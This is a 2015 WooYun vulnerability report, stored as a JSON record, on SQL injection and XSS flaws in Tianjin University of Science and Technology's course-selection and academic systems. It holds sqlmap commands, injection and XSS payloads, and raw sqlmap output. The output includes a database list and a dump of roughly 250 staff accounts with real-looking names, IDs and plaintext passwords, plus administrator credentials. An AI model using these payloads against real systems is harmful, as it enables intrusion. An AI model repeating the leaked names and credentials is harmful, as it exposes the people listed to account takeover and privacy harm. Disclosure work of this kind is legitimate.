{"id": 67707, "wybug_id": "wooyun-2015-0151675", "wybug_title": "天津科技大学某教务系统漏洞打包（大量学生和教师信息泄漏）", "wybug_corp": "天津科技大学", "wybug_author": "路人甲", "wybug_date": "2015-11-04 17:15", "wybug_open_date": "2015-11-09 17:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 梦里寻他千百度，蓦然回首那人却在灯火阑珊处！(据说发的多可以过!) 详细说明：  1. SQL注入（涉及23个数据库，几百张表吧，具体多少未深入，各种密码明文存储+弱口令）：\nsqlmap -u \"http://**.**.**.**/double/searchlook.asp\" --data=\"B12=%cc%e1%bd%bb&key=1*\" --dbs --batchsqlmap -u \"http://**.**.**.**/tcre/searchlook.asp\" --data=\"B12=%cc%e1%bd%bb&key=1*\" --dbs --batchsqlmap -u \"http://**.**.**.**/xuanke/search_result.asp\" --data=\"B12=%cc%e1%bd%bb&CID=1&course=1&number=1&xnxq=2012-2013-1\" --dbs --batchsqlmap -u \"http://**.**.**.**//xuanke/search_shouce.asp\" --data=\"B12=%cc%e1%bd%bb&bj=1\" --dbs --batch\n2. XSS：\nURL: http://**.**.**.**/neccs/login.aspPOST: account=1\" onmouseover=prompt(1); a=\"&btnLogin=%b5%c7%c2%bc&password=g00dPa%24%24w0rDURL: http://**.**.**.**/pthcs/login.aspPOST: account=1\" onmouseover=prompt(1); a=\"&btnLogin=%b5%c7%c2%bc&password=g00dPa%24%24w0rD\n   漏洞证明：  1. SQL注入（涉及23个数据库，几百张表吧，具体多少未深入，各种密码明文存储+弱口令）：\nsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: B12=11&key=1';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: B12=11&key=1' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(98)+CHAR(106)+CHAR(112)+CHAR(113)+CHAR(69)+CHAR(83)+CHAR(70)+CHAR(106)+CHAR(69)+CHAR(121)+CHAR(87)+CHAR(117)+CHAR(106)+CHAR(69)+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[09:29:20] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[09:29:20] [INFO] fetching database namesavailable databases [23]:[*] BookMaterialzhengli[*] BzBook[*] EVA[*] fan[*] faw-vo[*] FOTON[*] GJXYDB[*] hhtkf[*] jw[*] jw20150828bak[*] jwjw[*] jwNet[*] jwweb[*] master[*] model[*] msdb[*] Northwind[*] Packtest[*] pubs[*] SGMV_TPTX1[*] tempdb[*] ttts[*] woodenbox(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: B12=%cc%e1%bd%bb&bj=1';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 21 columns    Payload: B12=%cc%e1%bd%bb&bj=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(86)+CHAR(118)+CHAR(108)+CHAR(70)+CHAR(79)+CHAR(113)+CHAR(105)+CHAR(116)+CHAR(98)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[09:41:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000[09:41:21] [INFO] fetching current usercurrent user:    'jwsql'[09:41:21] [INFO] fetching current databasecurrent database:    'jwweb'[09:41:21] [INFO] testing if current user is DBAcurrent user is DBA:    FalseDatabase: jwweb+------------------------------------+---------+| Table                              | Entries |+------------------------------------+---------+| dbo.xuanke_result                  | 701861  || jwsql.xuanke_result_20080708       | 251355  || dbo.xuanke_result_20081229         | 239000  || dbo.xuanke_result_080901           | 164636  || jwsql.chongxiu                     | 158473  || dbo.xuanke_result_080902_20090305  | 136300  || dbo.xuanke_result_20090622         | 136300  || dbo.xuanke_result_20090212         | 135329  || jwsql.xuanke_result_20080311       | 127061  || dbo.xuanke_result_20080115         | 125852  || dbo.cet                            | 112943  || dbo.xuanke_result_20090622_no_stop | 104037  || jwsql.xuanke                       | 100948  || dbo.xuanke_result_20080822         | 100543  || dbo.temppp                         | 100138  || dbo.bychongxiu                     | 87939   || jwsql.double_backup_20140926       | 50038   || dbo.double_backup_20131008         | 45100   || dbo.tcre                           | 36773   || dbo.bugaixuan                      | 3557    || dbo.view_double_chongxiu           | 2388    || dbo.view_double_xfj                | 2388    || dbo.xuanke_result1                 | 1369    || dbo.tem                            | 722     || jwsql.mingdan                      | 60      || dbo.deleteName                     | 28      || dbo.sysconstraints                 | 9       || dbo.syssegments                    | 3       |+------------------------------------+---------+Database: evaTable: Tuserinfo[718 entries]+----------+----------+-----------+--------------+| Tuserid  | Tuserpwd | Tusertype | Tusername    |+----------+----------+-----------+--------------+[09:46:57] [WARNING] console output will be trimmed to last 256 rows due to large table size| 11009    | 123456   | 1         | 王玉杰          || 11010    | 123456   | 1         | 王刚志          || 11011    | 123456   | 1         | 王霞           || 11013    | 123456   | 1         | 邓启良          || 11015    | 123456   | 1         | 关泽满          || 11017    | 123456   | 1         | 刘建静          || 11018    | 123456   | 1         | 刘寅立          || 11019    | 123456   | 1         | 刘雁红          || 11024    | 123456   | 1         | 张大克          || 11025    | 123456   | 1         | 张励           || 11026    | 123456   | 1         | 张绍璞          || 11027    | 123456   | 1         | 张晨曦          || 11028    | 123456   | 1         | 李伟           || 11029    | 123456   | 1         | 李梅           || 11030    | 123456   | 1         | 李燕丽          || 11032    | 123456   | 1         | 杨迎花          || 11034    | 123456   | 1         | 杨艳斐          || 11036    | 123456   | 1         | 迟玉中          || 11037    | 123456   | 1         | 邱玉文          || 11040    | 123456   | 1         | 胡祥正          || 11041    | 123456   | 1         | 赵占芬          || 11042    | 123456   | 1         | 赵亚光          || 11044    | 123456   | 1         | 原凤英          || 11046    | 123456   | 1         | 郭艳玲          || 11047    | 123456   | 1         | 郭敏杰          || 11048    | 123456   | 1         | 高纯静          || 11050    | 123456   | 1         | 崔春仙          || 11051    | 123456   | 1         | 崔家峰          || 11052    | 123456   | 1         | 程绍玲          || 11055    | 123456   | 1         | 冀玲芳          || 11057    | 123456   | 1         | 汤红梅          || 11061    | 123456   | 1         | 李玉峰          || 11062    | 123456   | 1         | 李君           || 11063    | 123456   | 1         | 李杰红          || 11065    | 123456   | 1         | 于非非          || 11066    | 123456   | 1         | 韩聪           || 11067    | 123456   | 1         | 王小聪          || 11071    | 123456   | 1         | 秦月婷          || 11073    | 123456   | 1         | 樊志           || 11074    | 123456   | 1         | 陈鑫           || 11075    | 123456   | 1         | 孙成功          || 11076    | 123456   | 1         | 韩应华          || 11077    | 123456   | 1         | 廖嘉           || 11078    | 123456   | 1         | 郭慧梅          || 11080    | 123456   | 1         | 谢中华          || 11081    | 123456   | 1         | 刘凤林          || 11082    | 123456   | 1         | 张伟           || 11083    | 123456   | 1         | 杨华           || 11085    | 123456   | 1         | 袁泽惠          || 11086    | 123456   | 1         | 贾学龙          || 11087    | 123456   | 1         | 崔玉红          || 11088    | 123456   | 1         | 黄骁南          || 11090    | 123456   | 1         | 张桂香          || 11091    | 123456   | 1         | 张瑞华          || 11092    | 123456   | 1         | 宋永年          || 11093    | 123456   | 1         | 袁意哲          || 11097    | 123456   | 1         | 夏国坤          || 11098    | 123456   | 1         | 焦永芳          || 11110    | 123456   | 1         | 曹阳           || 11111    | 123456   | 1         | 郭娟           || 11114    | 123456   | 1         | 赵研           || 11116    | 123456   | 1         | 安丽娟          || 11117    | 123456   | 1         | 安力群          || 11118    | 123456   | 1         | 孙乃\\\\?86\\\\?b4 || 11119    | 123456   | 1         | 张瑞海          || 11120    | 123456   | 1         | 吴延昭          || 11122    | 123456   | 1         | 孙冬兰          || 11123    | 123456   | 1         | 张希彬          || 11124    | 123456   | 1         | 张淑娟          || 11125    | 123456   | 1         | 王洪武          || 11127    | 123456   | 1         | 孙立建          || 11128    | 123456   | 1         | 韩斌           || 11129    | 123456   | 1         | 王爱平          || 11130    | 123456   | 1         | 安明强          || 11131    | 123456   | 1         | 叶鹏           || 11132    | 123456   | 1         | 刘丽英          || 11133    | 123456   | 1         | 张立东          || 11134    | 123456   | 1         | 孟祥波          || 11135    | 123456   | 1         | 佘泽红          || 11136    | 123456   | 1         | 窦英           || 11138    | 123456   | 1         | 刘伟           || 11139    | 123456   | 1         | 刘靖           || 11140    | 123456   | 1         | 张海丽          || 11141    | 123456   | 1         | 程建军          || 11142    | 123456   | 1         | 邢化明          || 11143    | 123456   | 1         | 郝延明          || 11144    | 123456   | 1         | 乔岚           || 11145    | 123456   | 1         | 孙明晶          || 11146    | 123456   | 1         | 王芳           || 11147    | 123456   | 1         | 梁山           || 11148    | 123456   | 1         | 吕坤           || 11149    | 123456   | 1         | 任晓斌          || 11999    | 123456   | 1         | 外聘           || 12001    | 123456   | 1         | 丁峻           || 12002    | 123456   | 1         | 马洪           || 12003    | 123456   | 1         | 王巧平          || 12005    | 123456   | 1         | 王立君          || 12007    | 123456   | 1         | 王振平          || 12008    | 123456   | 1         | 王艳艳          || 12009    | 123456   | 1         | 冯秀云          || 12010    | 123456   | 1         | 卢佩媛          || 12011    | 123456   | 1         | 白敬萱          || 12012    | 123456   | 1         | 乔和鸣          || 12014    | 123456   | 1         | 刘莉           || 12016    | 123456   | 1         | 孙丙堂          || 12018    | 123456   | 1         | 江治刚          || 12019    | 123456   | 1         | 何广军          || 12021    | 123456   | 1         | 张育兰          || 12022    | 123456   | 1         | 张青           || 12026    | 123456   | 1         | 李广琴          || 12027    | 123456   | 1         | 李军花          || 12030    | 123456   | 1         | 杨秀珍          || 12031    | 123456   | 1         | 杨威           || 12032    | 123456   | 1         | 沈沛晶          || 12034    | 123456   | 1         | 邵以倩          || 12035    | 123456   | 1         | 陈孟华          || 12038    | 123456   | 1         | 陈清           || 12039    | 123456   | 1         | 陈薇           || 12041    | 123456   | 1         | 姚国树          || 12043    | 123456   | 1         | 赵平           || 12044    | 123456   | 1         | 赵国柱          || 12045    | 123456   | 1         | 赵颖           || 12047    | 123456   | 1         | 夏桐枝          || 12050    | 123456   | 1         | 顾毅           || 12052    | 123456   | 1         | 俞宝红          || 12056    | 123456   | 1         | 高巍           || 12058    | 123456   | 1         | 赵佩钦          || 12061    | 123456   | 1         | 刘洁           || 12065    | 123456   | 1         | 刘艳丽          || 12067    | 123456   | 1         | 顾晓薇          || 12068    | 123456   | 1         | 史丽薇          || 12069    | 123456   | 1         | 季杰梅          || 12070    | 123456   | 1         | 孙景           || 12071    | 123456   | 1         | 王遐           || 12072    | 123456   | 1         | 杰克           || 12073    | 123456   | 1         | 吴倩           || 12075    | 123456   | 1         | 刘海珍          || 12076    | 123456   | 1         | 闫丽华          || 12079    | 123456   | 1         | 任艳           || 12080    | 123456   | 1         | 王英娟          || 12081    | 123456   | 1         | 白文娟          || 12082    | 123456   | 1         | 张淑梅          || 12083    | 123456   | 1         | 赵春玲          || 12085    | 123456   | 1         | 赵端阳          || 12086    | 123456   | 1         | 张树华          || 12087    | 123456   | 1         | 姜蕊           || 12088    | 123456   | 1         | 易龙           || 12090    | 123456   | 1         | 外教B          || 12091    | 123456   | 1         | 宋丽红          || 12092    | 123456   | 1         | 沙宁           || 12093    | 123456   | 1         | 付海燕          || 12095    | 123456   | 1         | 韩维柱          || 12096    | 123456   | 1         | 刘艳华          || 12097    | 123456   | 1         | 李政文          || 12099    | 123456   | 1         | 孙斐瑾          || 12101    | 123456   | 1         | 韩会玉          || 12102    | 123456   | 1         | 樊慧           || 12104    | 123456   | 1         | 周萌           || 12106    | 123456   | 1         | 曹修平          || 12107    | 123456   | 1         | 闫金钟          || 12109    | 123456   | 1         | 王颖           || 12110    | 123456   | 1         | 吴晓龙          || 12114    | 123456   | 1         | 褚红珍          || 12116    | 123456   | 1         | 赵磊           || 12119    | 123456   | 1         | 苌文博          || 12120    | 123456   | 1         | 孙洪振          || 12123    | 123456   | 1         | 纪丽丽          || 12124    | 123456   | 1         | 邱爱杰          || 12125    | 123456   | 1         | 史倩倩          || 12128    | 123456   | 1         | 郑东升          || 12131    | 123456   | 1         | 薛红宏          || 12132    | 123456   | 1         | 邹锦           || 12133    | 123456   | 1         | 单海英          || 12135    | 123456   | 1         | 合田           || 12139    | 123456   | 1         | 侯杰           || 12160    | 123456   | 1         | 刘向东          || 12207    | 123456   | 1         | 李瑶           || 12890    | 123456   | 1         | 信定           || 12893    | 123456   | 1         | 待聘1          || 12894    | 123456   | 1         | 外聘4          || 12991    | 123456   | 1         | 外聘2          || 14009    | 123456   | 1         | 李静           || 14011    | 123456   | 1         | 方国臻          || 14012    | 123456   | 1         | 朱振元          || 14013    | 123456   | 1         | 李喜宏          || 14016    | 123456   | 1         | 刘清岱          || 14019    | 123456   | 1         | 王玉荣          || 14020    | 123456   | 1         | 王志伟          || 14023    | 123456   | 1         | 刘冰           || 14024    | 123456   | 1         | 杜欣军          || 14026    | 123456   | 1         | 刘会平          || 14027    | 123456   | 1         | 陈勉华          || 14028    | 123456   | 1         | 王金菊          || 14031    | 123456   | 1         | 朱华平          || 14092    | 123456   | 1         | 王 芳          || 14093    | 123456   | 1         | 李凤娟          || 14304    | 123456   | 1         | 郭南南          || 20004    | 123456   | 1         | 武慧敏          || 20005    | 123456   | 1         | 胡真           || 20010    | 123456   | 1         | chris        || 20016    | 123456   | 1         | 外教3          || 20017    | 123456   | 1         | 外教4          || 20018    | 123456   | 1         | 外教5          || 20023    | 123456   | 1         | 外教1          || 20024    | 123456   | 1         | 外教2          || 20025    | 123456   | 1         | 临时外教3        || 20026    | 123456   | 1         | 临时外教4        || 20027    | 123456   | 1         | 临时外教5        || 20991    | 123456   | 1         | 外聘 国际        || 20992    | 123456   | 1         | 外聘2 国际       || 20994    | 123456   | 1         | 外聘3 国际       || 20995    | 123456   | 1         | 外聘5国际        || 20996    | 123456   | 1         | 外聘6国际        || 20997    | 123456   | 1         | 外聘7国际        || 23004    | 123456   | 1         | 张月英          || 23008    | 123456   | 1         | 李凌杰          || 23013    | 123456   | 1         | 陈大辉          || 23018    | 123456   | 1         | 张红岩          || 23020    | 123456   | 1         | 王博           || 23021    | 123456   | 1         | 焦秋阳          || 28028    | 123456   | 1         | 范爱春          || 99009    | 123456   | 1         | 马雷           || 99016    | 123456   | 1         | 李彦启          || 99017    | 123456   | 1         | 崔永岩          || 99029    | 123456   | 1         | 王帆           || 99030    | 123456   | 1         | 李怡           || 99031    | 123456   | 3         | 孟少英          || 99035    | 123456   | 1         | 朱萌           || 99036    | 123456   | 1         | 穆娜           || 99040    | 123456   | 1         | 王荔           || 99043    | 123456   | 1         | 周立群          || S04001   | 123456   | 1         | 王昌禄          || S04003   | 123456   | 1         | 王艳萍          || S04007   | 123456   | 1         | 白小佳          || S04008   | 123456   | 1         | 刘安军          || S04009   | 123456   | 1         | 刘常金          || S04010   | 123456   | 1         | 吕晓玲          || S04011   | 123456   | 1         | 孙平           || S04014   | 123456   | 1         | 阮美娟          || S04017   | 123456   | 1         | 张泽生          || S04019   | 123456   | 1         | 张燕           || S04020   | 123456   | 1         | 李文钊          || S04022   | 123456   | 1         | 汪建明          || S04029   | 123456   | 1         | 赵征           || S04037   | 123456   | 1         | 曹东旭          || S04046   | 123456   | 1         | 王俊平          || S04047   | 123456   | 1         | 胡爱军          || S04048   | 123456   | 1         | 张民           || S04049   | 123456   | 1         | 郭红莲          || S04050   | 123456   | 1         | 王春玲          || S04053   | 123456   | 1         | 王稳航          || S04056   | 123456   | 1         | 李昌模          || S04058   | 123456   | 1         | 陈野           || 02060    | 123456   | 3         | 杨伟明          || 123456   | 123456   | 3         | qwe          || 98211822 | 123456   | 3         | 邱强           |+----------+----------+-----------+--------------+Database: jwnetTable: admin[5 entries]+-----+---------+----------------------------------+--------------------+------------+-----------+-----------+| aid | keshiid | apass                            | adate              | aname      | keshiming | apassword |+-----+---------+----------------------------------+--------------------+------------+-----------+-----------+| 10  | 1       | 9530EC800634D1A98E43BF0188CF89C3 | 04  7 2010  6:17PM | jxyx       | 教学运行科     | jxyx      || 11  | 3       | F75C43BFB5FC0667942671376ABF5722 | NULL               | jxzl       | 教学质量科     | jxzl      || 12  | 2       | 4BFE1FA76D56A687BE3DE5B40E14D205 | NULL               | jxyj       | 教学研究科     | jxyj      || 13  | 4       | BDAEB4300E2F117DE36F7912B46D800C | NULL               | sjjx       | 实践教学      | sjjx      || 9   | 5       | 9CE853EB7EE8E362E1D121EB4DF2DC91 | 04  7 2007  6:17PM | 51aspx     | NULL      | 51aspx    |+-----+---------+----------------------------------+--------------------+------------+-----------+-----------+\n2. XSS：\n\n\n\n   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-09 17:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}